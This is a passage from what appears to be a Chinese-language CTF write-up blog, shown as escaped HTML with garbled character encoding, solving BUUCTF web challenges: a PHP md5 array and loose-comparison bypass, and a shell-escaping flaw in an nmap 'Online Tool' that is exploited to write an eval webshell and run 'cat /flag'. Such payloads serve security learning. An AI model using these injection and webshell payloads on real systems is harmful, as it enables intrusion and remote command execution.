&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;&amp;#34;[start]ç¨‹åºå¼€å§‹:&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; str(start_time))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; thread_list &lt;span style="color:#f92672"&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; fileName &lt;span style="color:#f92672"&gt;in&lt;/span&gt; fileNames:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; t &lt;span style="color:#f92672"&gt;=&lt;/span&gt; threading&lt;span style="color:#f92672"&gt;.&lt;/span&gt;Thread(target&lt;span style="color:#f92672"&gt;=&lt;/span&gt;run,args&lt;span style="color:#f92672"&gt;=&lt;/span&gt;(fileName,))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; thread_list&lt;span style="color:#f92672"&gt;.&lt;/span&gt;append(t)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; t &lt;span style="color:#f92672"&gt;in&lt;/span&gt; thread_list:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; t&lt;span style="color:#f92672"&gt;.&lt;/span&gt;start()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; t &lt;span style="color:#f92672"&gt;in&lt;/span&gt; thread_list:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; t&lt;span style="color:#f92672"&gt;.&lt;/span&gt;join()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå°±æ˜¯è®¿é—®&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-url" data-lang="url"&gt;http://dd1c66d5-66b2-4b82-a2a8-bf7bfbecdd97.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è·å¾—flag&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="mrctf2020ez_bypass"&gt;[MRCTF2020]Ez_bypass
&lt;/h1&gt;&lt;p&gt;ä¸æˆªå›¾äº†ï¼Œä¸»é¡µæ²¡æœ‰ä»£ç æ ¼å¼ï¼Œè´´ä¸€ä¸ªæºç &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;I&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;put&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;something&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;in&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;F12&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;you&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;include&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;flag.php&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$flag&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;gg&amp;#39;&lt;/span&gt;])&lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $id&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $gg&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;gg&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;md5&lt;/span&gt;($id) &lt;span style="color:#f92672"&gt;===&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;md5&lt;/span&gt;($gg) &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; $id &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; $gg) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;You got the first step&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;passwd&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $passwd&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;passwd&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;is_numeric&lt;/span&gt;($passwd))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($passwd&lt;span style="color:#f92672"&gt;==&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1234567&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;Good Job!&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;highlight_file&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;flag.php&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;By Retr_0&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;can you think twice??&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;You can not get it !&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;only one way to get the flag&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;You are not a real hacker!&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;Please input first&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}&lt;span style="color:#a6e22e"&gt;Please&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;input&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;first&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åˆ†æä¸€æ³¢ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç¬¬7è¡Œæ˜¯ç¬¬ä¸€å±‚éœ€è¦md5çš„å€¼ç›¸åŒä½†æ˜¯ä¸¤ä¸ªå˜é‡ä¸åŒï¼Œéœ€è¦æ³¨æ„æ˜¯å¼ºæ¯”è¾ƒ&lt;code&gt;===&lt;/code&gt;å™¢ã€‚&lt;/li&gt;
&lt;li&gt;ç¬¬11ã€17è¡Œåˆ¤æ–­passwdæ˜¯éæ•°å­—å¹¶ä¸”è‹¥æ¯”è¾ƒ&lt;code&gt;==&lt;/code&gt;ç­‰äº1234567&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç¬¬ä¸€ä¸ªåˆ©ç”¨æ•°ç»„å³å¯ç»•è¿‡&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;md5([1,2,3]) == md5([4,5,6]) == NULL
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç¬¬äºŒä¸ªåˆ©ç”¨æ¯”è¾ƒæ—¶ä¼šè¿›è¡Œç±»å‹è½¬æ¢ï¼Œå­—ç¬¦ä¸²&lt;code&gt;1234567a&lt;/code&gt;ä¼šè¢«å¼ºåˆ¶è½¬æ¢ç±»å‹ä¸ºæ•´å‹çš„&lt;code&gt;1234567&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?id[]=1&amp;amp;gg[]=2
POST
passwd=1234567a
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="buuctf-2018online-tool"&gt;[BUUCTF 2018]Online Tool
&lt;/h1&gt;&lt;p&gt;æºç &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_SERVER[&lt;span style="color:#e6db74"&gt;&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $_SERVER[&lt;span style="color:#e6db74"&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_SERVER[&lt;span style="color:#e6db74"&gt;&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;host&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;highlight_file&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;__FILE__&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;} &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;host&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;escapeshellarg&lt;/span&gt;($host);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;escapeshellcmd&lt;/span&gt;($host);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $sandbox &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;md5&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;glzjin&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt; $_SERVER[&lt;span style="color:#e6db74"&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;you are in sandbox &amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$sandbox;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;@&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;mkdir&lt;/span&gt;($sandbox);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;chdir&lt;/span&gt;($sandbox);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;system&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;nmap -T5 -sT -Pn --host-timeout 2 -F &amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$host);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ€åæœ‰ä¸€ä¸ªsystemå‡½æ•°ï¼Œä½†æ˜¯ä½¿ç”¨çš„nmapçš„æŒ‡ä»¤ï¼Œç»è¿‡ä¸€ç•ªæœç´¢å¾—çŸ¥äº†nmapå¯ä»¥æŠŠç»“æœå­˜å‚¨åœ¨æ–‡ä»¶é‡Œï¼Œæ‰€ä»¥è¿™é“é¢˜ä¹Ÿæ˜¯é“RCEã€‚è¿˜æœ‰ä¸¤ä¸ªæ²¡è§è¿‡çš„å‡½æ•°&lt;code&gt;escapeshellarg&lt;/code&gt;ã€&lt;code&gt;escapeshellcmd&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜åˆ©ç”¨äº†ä¸¤ä¸ªç‚¹&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;nmapå¯ä»¥å°†æ‰«æçš„ç»“æœå­˜å‚¨åœ¨æ–‡ä»¶é‡Œã€‚ä½¿ç”¨æ–¹æ³•ï¼š&lt;a class="link" href="https://blog.csdn.net/weixin_34221036/article/details/92148628" target="_blank" rel="noopener"
&gt;Nmapæ‰«æç»“æœçš„ä¿å­˜å’Œè¾“å‡º&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;escapeshellarg+escapeshellcmdåŒæ—¶ä½¿ç”¨æœ‰ä¸€äº›æ¼æ´&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class="link" href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener"
&gt;è°ˆè°ˆescapeshellargå‚æ•°ç»•è¿‡å’Œæ³¨å…¥çš„é—®é¢˜&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://paper.seebug.org/164/" target="_blank" rel="noopener"
&gt;PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å‚è€ƒåšå®¢æ•´ç†ä¸€ä¸‹è¿™ä¸¤ä¸ªå¤„ç†å‘½ä»¤çš„å‡½æ•°åŒæ—¶ä½¿ç”¨æ—¶çš„é—®é¢˜ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å‡å¦‚ä¼ å…¥çš„å‚æ•°ä¸º&lt;code&gt;172.17.0.2' -v -d a=1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;é¦–å…ˆç»è¿‡&lt;code&gt;escapeshellarg&lt;/code&gt;å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šæŠŠå•ç‹¬çš„å•å¼•å·&lt;code&gt;'&lt;/code&gt;åŠ ä¸Šè½¬ä¹‰ç¬¦&lt;code&gt;\&lt;/code&gt;å¹¶ä½¿ç”¨å•å¼•å·&lt;code&gt;'&lt;/code&gt;æ‹¬èµ·æ¥ï¼Œå†ä½¿ç”¨å•å¼•å·&lt;code&gt;'&lt;/code&gt;æŠŠæ•´ä¸ªå‚æ•°æ‹¬èµ·æ¥ã€‚è¿™æ—¶å€™çš„å‚æ•°æ˜¯&lt;code&gt;'172.17.0.2'\'' -v -d a=1'&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;å†è¿›å…¥&lt;code&gt;escapeshellcmd&lt;/code&gt;å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ï¼ˆä»å·¦è‡³å³ä¼šæŠŠè½å•çš„ç¬¦å·ç›´æ¥åŠ è½¬ä¹‰ç¬¦ï¼Œå…¶ä»–ä»€ä¹ˆéƒ½ä¸åšï¼‰é‡åˆ°æˆå¯¹åŒ¹é…çš„å•å¼•å·&lt;code&gt;'&lt;/code&gt;ä¸è¿‡å¤„ç†ï¼Œè½¬ä¹‰ç¬¦&lt;code&gt;\&lt;/code&gt;å†ä½¿ç”¨è½¬ä¹‰ç¬¦è½¬ä¹‰ï¼Œå†ç•¥è¿‡ä¸€ä¸ªæˆå¯¹çš„å•å¼•å·&lt;code&gt;''&lt;/code&gt;ï¼Œæœ€åä¸€ä¸ªå•å¼•å·&lt;code&gt;'&lt;/code&gt;å†ä½¿ç”¨è½¬ä¹‰ç¬¦è½¬ä¹‰ã€‚è¿™æ—¶å€™çš„å‚æ•°å°±æˆäº†&lt;code&gt;'172.17.0.2'\\'' -v -d a=1\'&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;æœ€åæ‰§è¡Œçš„å‚æ•°æ˜¯&lt;code&gt;'172.17.0.2'\\'' -v -d a=1\'&lt;/code&gt;ï¼Œç”±äºä¸­é—´çš„&lt;code&gt;\\&lt;/code&gt;è¢«è§£é‡Šä¸º&lt;code&gt;\&lt;/code&gt;è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„&lt;code&gt;'&lt;/code&gt;æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„&lt;code&gt;'&lt;/code&gt;é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸º&lt;code&gt; 172.17.0.2\ -v -d a=1'&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æ‰€ä»¥æ„é€ payloadï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;&amp;#39;&amp;lt;?php eval($_POST[_]) ?&amp;gt; -oG 1.php &amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç»è¿‡&lt;code&gt;escapeshellarg&lt;/code&gt;å‡½æ•°ä¼šè¢«è§£ææˆä¸ºï¼š&lt;code&gt;''\''&amp;lt;?php eval($_POST[_]) ?&amp;gt; -oG 1.php '\'''&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;å†ç»è¿‡&lt;code&gt;escapeshellcmd&lt;/code&gt;å‡½æ•°ä¼šè¢«è§£æä¸ºï¼š&lt;code&gt;''\\''&amp;lt;?php eval($_POST[_]) ?&amp;gt; -oG 1.php '\\'''&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;æ³¨æ„æœ€åå•å¼•å·å‰é¢çš„é‚£ä¸ªç©ºæ ¼å¾ˆé‡è¦ï¼Œå¦‚æœæ˜¯ç´§æŒ¨ç€çš„è¯æ–‡ä»¶åç§°å°±æˆäº†&lt;code&gt;1.php\&lt;/code&gt;ä¸åœ¨æ˜¯phpæ–‡ä»¶äº†ã€‚æ‰€ä»¥æˆ‘ä»¬çš„payloadæœ€ç»ˆåœ¨æœåŠ¡å™¨ç«¯æ˜¯ï¼š&lt;code&gt;\&amp;lt;?php eval($_POST[_]) ?&amp;gt; -oG 1.php \ &lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;åŠ ç©ºæ ¼ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢æ–‡ä»¶ååç¼€ä¸­å‡ºç°ç¬¦å·ï¼ŒåŠ ä¸Šç©ºæ ¼å°±ä¼šèˆå»ã€‚&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#39;&amp;lt;?php eval(&lt;/span&gt;&lt;span style="color:#e6db74"&gt;$_POST[_]&lt;/span&gt;&lt;span style="color:#e6db74"&gt;) ?&amp;gt; -oG 1.php &amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; $host&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;escapeshellarg&lt;/span&gt;($host);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; $host&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;escapeshellcmd&lt;/span&gt;($host);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; $host&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;&amp;#39;&amp;lt;?php eval() ?&amp;gt; -oG 1.php &amp;#39;
&amp;#39;&amp;#39;\&amp;#39;&amp;#39;&amp;lt;?php eval() ?&amp;gt; -oG 1.php &amp;#39;\&amp;#39;&amp;#39;&amp;#39;
&amp;#39;&amp;#39;\\&amp;#39;&amp;#39;\&amp;lt;\?php eval\(\) \?\&amp;gt; -oG 1.php &amp;#39;\\&amp;#39;&amp;#39;&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æœ€ç»ˆè¯·æ±‚payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/?host=&amp;#39;&amp;lt;?php eval($_POST[_]) ?&amp;gt; -oG 1.php &amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ‰§è¡ŒæŒ‡ä»¤æ—¶ä¼šåˆ›å»ºä¸€ä¸ªsandboxæ–‡ä»¶å¤¹ï¼Œè®¿é—®&lt;code&gt;$sandbox$/1.php&lt;/code&gt;ï¼ŒPOSTä¼ å‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310110615.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;_=system(&amp;#39;cat /flag&amp;#39;);
